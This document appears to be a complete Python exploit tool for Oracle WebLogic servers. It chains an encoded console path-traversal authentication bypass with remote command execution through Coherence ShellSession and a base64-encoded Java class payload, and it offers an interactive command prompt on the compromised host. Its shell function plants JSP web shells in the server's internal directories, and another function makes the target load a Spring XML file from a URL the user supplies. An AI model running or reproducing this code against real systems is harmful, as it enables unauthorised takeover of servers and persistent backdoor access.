import requests
import sys
import time
import http.client
http.client.HTTPConnection._http_vsn = 10
http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'
from urllib.parse import urlparse

vultype = 0
echotype = 0

def check_vul(url):
    global vultype
    headers = {
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        "Content-Type":"application/x-www-form-urlencoded"
    }

    check_url = url + '/console/css/%252e%252e%252fconsolejndi.portal'

    while 1:
        rsp = requests.get(url=check_url, headers=headers, allow_redirects=False, verify=False, timeout=5)
        if 'Deploying Application' in rsp.text:
            time.sleep(1)
        else:
            if rsp.status_code == 200:
                print('[+] status_code is ' + str(rsp.status_code) + ', maybe has vul!')
                vultype = 1
            elif rsp.status_code == 302:
                print('[+] status_code is ' + str(rsp.status_code) + ', maybe has vul!')
                vultype = 1
            else:
                print('[-] status_code is ' + str(rsp.status_code) + ', vul not found!')
            break


def echo_test_12_2(url, cmd):
    url = url + '/console/css/%252e%252e%252fconsolejndi.portal'
    headers_12_2 = {
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        "Content-Type":"application/x-www-form-urlencoded",
        "c":cmd
    }

    payload = '''handle=com.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThread%20currentThread%20=%20(weblogic.work.ExecuteThread)Thread.currentThread();%20weblogic.work.WorkAdapter%20adapter%20=%20currentThread.getCurrentWork();%20java.lang.reflect.Field%20field%20=%20adapter.getClass().getDeclaredField(%22connectionHandler%22);field.setAccessible(true);Object%20obj%20=%20field.get(adapter);weblogic.servlet.internal.ServletRequestImpl%20req%20=%20(weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(%22getServletRequest%22).invoke(obj);%20String%20cmd%20=%20req.getHeader(%22c%22);String%5B%5D%20cmds%20=%20System.getProperty(%22os.name%22).toLowerCase().contains(%22window%22)%20?%20new%20String%5B%5D%7B%22cmd.exe%22,%20%22/c%22,%20cmd%7D%20:%20new%20String%5B%5D%7B%22/bin/sh%22,%20%22-c%22,%20cmd%7D;if(cmd%20!=%20null%20)%7B%20String%20result%20=%20new%20java.util.Scanner(new%20java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(%22%5C%5CA%22).next();%20weblogic.servlet.internal.ServletResponseImpl%20res%20=%20(weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(%22getResponse%22).invoke(req);res.getServletOutputStream().writeStream(new%20weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();%7D%20currentThread.interrupt();')'''
    rsp = requests.post(url=url, headers=headers_12_2, data=payload, allow_redirects=False, verify=False, timeout=5)
    return rsp.text
    

def echo_test_12_1(url, cmd):
    code = '''<java>
			<void class="sun.misc.BASE64Decoder">
				<void method="decodeBuffer" id="byte_arr">	<string>yv66vgAAADIAgwoAHwBIBwBJCgACAEoHAEsKAAQASAoABABMCgACAE0KAAIATgoAAgBPBwBQCABRCgBSAFMKABAAVAgAVQoAEABWBwBXCABYCABZCABaCABbCgBcAF0KAFwAXgoAXwBgBwBhCgAYAEgKAGIAYwoAGABkCgAYAGUKABAAZgcAZwcAaAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTFRlc3Q7AQAGdXBsb2FkAQAnKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nOylWAQAQZmlsZU91dHB1dFN0cmVhbQEAGkxqYXZhL2lvL0ZpbGVPdXRwdXRTdHJlYW07AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEABHBhdGgBABJMamF2YS9sYW5nL1N0cmluZzsBAAR0ZXh0AQANU3RhY2tNYXBUYWJsZQcAUAEABGV4ZWMBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEABG5hbWUBAARjbWRzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAmluAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQADYnVmAQACW0IBAANsZW4BAAFJAQADb3V0AQAfTGphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtOwEAA2NtZAcAVwcANgcAZwcAaQcAOgcAYQEAClNvdXJjZUZpbGUBAB5UZXN0LmphdmEgZnJvbSBJbnB1dEZpbGVPYmplY3QMACAAIQEAGGphdmEvaW8vRmlsZU91dHB1dFN0cmVhbQwAIABqAQAWc3VuL21pc2MvQkFTRTY0RGVjb2RlcgwAawBsDABtAG4MAG8AIQwAcAAhAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAB29zLm5hbWUHAHEMAHIAMwwAcwB0AQADd2luDAB1AHYBABBqYXZhL2xhbmcvU3RyaW5nAQAHY21kLmV4ZQEAAi9jAQAHL2Jpbi9zaAEAAi1jBwB3DAB4AHkMADIAegcAewwAfAB9AQAdamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW0HAGkMAH4AfwwAbQCADACBAIIMACAAbgEABFRlc3QBABBqYXZhL2xhbmcvT2JqZWN0AQATamF2YS9pby9JbnB1dFN0cmVhbQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEADGRlY29kZUJ1ZmZlcgEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBAAV3cml0ZQEABShbQilWAQAFZmx1c2gBAAVjbG9zZQEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBAARyZWFkAQAFKFtCKUkBAAcoW0JJSSlWAQALdG9CeXRlQXJyYXkBAAQoKVtCACEAHgAfAAAAAAADAAEAIAAhAAEAIgAAAC8AAQABAAAABSq3AAGxAAAAAgAjAAAABgABAAAACAAkAAAADAABAAAABQAlACYAAAABACcAKAABACIAAACkAAMABAAAACW7AAJZK7cAA04tuwAEWbcABSy2AAa2AActtgAILbYACacABE6xAAEAAAAgACMACgADACMAAAAeAAcAAAALAAkADAAYAA0AHAAOACAAEQAjAA8AJAASACQAAAA0AAUACQAXACkAKgADACQAAAArACwAAwAAACUAJQAmAAAAAAAlAC0ALgABAAAAJQAvAC4AAgAwAAAABwACYwcAMQAAAQAyADMAAQAiAAABcgAEAAgAAACIEgu4AAxNLMYAJCy2AA0SDrYAD5kAGAa9ABBZAxIRU1kEEhJTWQUrU6cAFQa9ABBZAxITU1kEEhRTWQUrU064ABUttgAWtgAXOgQRBAC8CDoFAzYGuwAYWbcAGToHGQQZBbYAGlk2BgKfABAZBxkFAxUGtgAbp//ouwAQWRkHtgActwAdsE0BsAABAAAAhACFAAoAAwAjAAAALgALAAAAFgAGABcAPgAYAEoAGQBRABoAVAAbAF0AHABrAB0AeAAfAIUAIACGACMAJAAAAFwACQAGAH8ANAAuAAIAPgBHADUANgADAEoAOwA3ADgABABRADQAOQA6AAUAVAAxADsAPAAGAF0AKAA9AD4ABwCGAAAAKwAsAAIAAACIACUAJgAAAAAAiAA/AC4AAQAwAAAAOgAF/AArBwBAUQcAQf8AHwAIBwBCBwBABwBABwBBBwBDBwBEAQcARQAAGv8ADAACBwBCBwBAAAEHADEAAQBGAAAAAgBH</string>
				</void>
			</void>
			<void class="org.mozilla.classfile.DefiningClassLoader">
				<void method="defineClass">
					<string>Test</string>
					<object idref="byte_arr"></object>
					<void method="newInstance">
						<void method="exec" id="result">
							<string>{}</string>
						</void>
					</void>
				</void>
			</void>

			<void class="java.lang.Thread" method="currentThread">
				<void method="getCurrentWork" id="current_work">
					<void method="getClass">
						<void method="getDeclaredField">
							<string>connectionHandler</string>
								<void method="setAccessible"><boolean>true</boolean></void>
							<void method="get">
								<object idref="current_work"></object>
								<void method="getServletRequest">
									<void method="getResponse">
										<void method="getServletOutputStream">
											<void method="writeStream">
												<object class="weblogic.xml.util.StringInputStream"><object idref="result"></object></object>
												</void>
											<void method="flush"/>
											</void>
									<void method="getWriter"><void method="write"><string></string></void></void>
									</void>
								</void>
							</void>
						</void>
					</void>
				</void>
			</void>
		</java>'''.format(cmd)
    payload = 'org.slf4j.ext.EventData("{}")'.format(code)
    url = url + '/console/css/%252e%252e%252fconsolejndi.portal'
    headers_12_1 = {
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        "Content-Type":"application/x-www-form-urlencoded"
    }
    rsp = requests.post(url=url, headers=headers_12_1, data='handle=' + payload, allow_redirects=False, verify=False, timeout=5)
    return rsp.text

def generate_payload_ShellSession_linux():
    code = '''com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec(new+String[]{"/bin/sh","-c","find+$DOMAIN_HOME+-type+d+-name+bea_wls_internal|while+read+f%3bdo+find+$f+-type+f+-name+index.html%3bdone|while+read+ff%3bdo+echo+PCVAcGFnZSBjb250ZW50VHlwZT0idGV4dC9odG1sOyBjaGFyc2V0PVVURi04IiAlPgo8JUBwYWdlIGltcG9ydD0iamF2YS5pby4qIiAlPgo8JQogICAgU3RyaW5nIGNtZCA9IHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJjbWQiKTsKICAgIFN0cmluZyBuYW1lPVN5c3RlbS5nZXRQcm9wZXJ0eSgib3MubmFtZSIpOwogICAgU3RyaW5nW10gY21kcyA9bmFtZSE9bnVsbCYmbmFtZS50b0xvd2VyQ2FzZSgpLmNvbnRhaW5zKCJ3aW4iKSA/IG5ldyBTdHJpbmdbXXsiY21kLmV4ZSIsICIvYyIsICBjbWR9Om5ldyBTdHJpbmdbXXsiL2Jpbi9zaCIsICItYyIsIGNtZH07CiAgICBJbnB1dFN0cmVhbSBpbiA9IFJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMoY21kcykuZ2V0SW5wdXRTdHJlYW0oKTsKICAgIGJ5dGVbXSBidWY9bmV3IGJ5dGVbMTAyNF07CiAgICBpbnQgbGVuPTA7CiAgICBCeXRlQXJyYXlPdXRwdXRTdHJlYW0gYm9zPW5ldyBCeXRlQXJyYXlPdXRwdXRTdHJlYW0oKTsKICAgIHdoaWxlICgobGVuPWluLnJlYWQoYnVmKSkhPS0xKXsKICAgICAgICBib3Mud3JpdGUoYnVmLDAsbGVuKTsKICAgIH0KICAgIHJlc3BvbnNlLmdldFdyaXRlcigpLndyaXRlKG5ldyBTdHJpbmcoYm9zLnRvQnl0ZUFycmF5KCkpKTsKJT4%3d|base64+-d>$ff.jsp%3bdone"})%3b")'''
    payload = 'handle=com.tangosol.coherence.mvel2.sh.ShellSession("{}")'.format(code)
    return payload

def generate_payload_ShellSession_windows_1():
    code = '''com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec(new+String[]{"cmd.exe","/c","for+/f+%25i+in+('dir+/x+/s+/b+%25DOMAIN_HOME%25\\bea_wls_internal')+do+dir+/b+/x+/s+%25i\index.html>c%3a\windows\\temp\p.txt"})%3b")'''
    payload = 'handle=com.tangosol.coherence.mvel2.sh.ShellSession("{}")'.format(code)
    return payload

def generate_payload_ShellSession_windows_2():
    code = '''com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec(new+String[]{"cmd.exe","/c","for+/f+%25j+in+(c%3a\windows\\temp\p.txt)+do+echo+^<%25%40page+contentType%3d"text/html%3b+charset%3dUTF-8"+%25^>^<%25%40page+import%3d"java.io.*"%25^>^<%25String+cmd+%3d+null%3bcmd%3drequest.getParameter("cmd")%3bString+output+%3d+null%3bif(cmd+!%3d+null)+{String+s+%3d+null%3bProcess+p+%3d+Runtime.getRuntime().exec(new+String[]{"cmd.exe","/c",cmd})%3bBufferedReader+sI+%3d+new+BufferedReader(new+InputStreamReader(p.getInputStream()))%3bwhile((s+%3d+sI.readLine())+!%3d+null)+{output+%2b%3d+s%3b}}%25^>^<%25%3doutput+%25^>+>%25j.jsp"})%3b")'''
    payload = 'handle=com.tangosol.coherence.mvel2.sh.ShellSession("{}")'.format(code)
    return payload

def shell(url):
    url = url + '/console/css/%252e%252e%252fconsolejndi.portal'
    headers = {
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        "Content-Type":"application/x-www-form-urlencoded"
    }
    payload = generate_payload_ShellSession_linux()
    rsp = requests.post(url=url, headers=headers, data=payload, allow_redirects=False, verify=False, timeout=5)
    time.sleep(1)
    payload = generate_payload_ShellSession_windows_1()
    rsp = requests.post(url=url, headers=headers, data=payload, allow_redirects=False, verify=False, timeout=5)
    time.sleep(1)
    payload = generate_payload_ShellSession_windows_2()
    rsp = requests.post(url=url, headers=headers, data=payload, allow_redirects=False, verify=False, timeout=5)
    rsp_result = requests.get(url+'/bea_wls_internal/index.html.jsp?cmd='+'echo luckyeast').text
    if 'luckyeast' in rsp_result:
        print('shell is: '+url+'/bea_wls_internal/index.html.jsp?cmd=whoami')
    else:
        print('write failed')

def xml_test(url, xmlurl):
    url = url + '/console/css/%252e%252e%252fconsole.portal'
    headers = {
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        "Content-Type":"application/x-www-form-urlencoded"
    }
    payload = '_nfpb=true&_pageLabel=HomePage1&handle=com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext(' + '\'' + xmlurl + '\'' + ')'
    rsp = requests.post(url=url, headers=headers, data=payload, allow_redirects=False, verify=False)
    if rsp.status_code == 200:
        print('[+] request is send, plz check')
    else:
        print('[-] xmlurl is not valid, plz check!!!')
    

def main():
    print('''
-------------------------------------
weblogic test script by LuckyEast >_< 
-------------------------------------
''')
    global echotype
    url = sys.argv[1]
    check_vul(url)
    if vultype == 1:
        sign = 'echo luckyeast'
        print('[+] start echo test 12.2...')
        rsp = echo_test_12_2(url,sign)
        if 'luckyeast' in rsp:
            print('[+] echo success! type is 12.2')
            echotype = 2
        if echotype == 0:
            print('[+] start echo test 12.1...')
            rsp = echo_test_12_1(url, sign)
            if 'luckyeast' in rsp:
                print('[+] echo success! type is 12.1')
                echotype = 1    
        if echotype == 1:
            while 1:
                cmd = input('command: ')
                if cmd == 'exit':
                    break
                else:
                    print(echo_test_12_1(url, cmd))
        elif echotype == 2:
            while 1:
                cmd = input('command: ')
                if cmd == 'exit':
                    break
                else:
                    print(echo_test_12_2(url, cmd))
        else:
            result = input('[-] echo test failed, write shell or xml? s or x: ')
            if result == 's':
                shell(url)
            elif result == 'x':
                xmlurl = input('[+] plz input xml url: ')
                xml_test(url, xmlurl)

if __name__ == '__main__':
    main()
